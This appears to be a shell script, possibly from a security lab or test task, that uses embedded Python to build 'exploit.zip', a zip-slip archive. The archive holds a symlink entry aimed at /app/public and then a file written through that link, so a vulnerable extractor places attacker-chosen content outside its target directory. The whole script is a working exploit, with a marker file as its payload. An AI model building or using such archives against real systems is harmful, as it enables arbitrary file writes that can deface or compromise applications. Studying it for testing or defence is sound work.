#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'PY'
import os
import zipfile
with zipfile.ZipFile(os.path.join(os.environ['OUT_DIR'], 'exploit.zip'),'w') as z:
    info=zipfile.ZipInfo('link'); info.external_attr=0o120777 << 16
    z.writestr(info,'/app/public')
    z.writestr('link/pwned.txt','owned-by-zip-slip')
PY
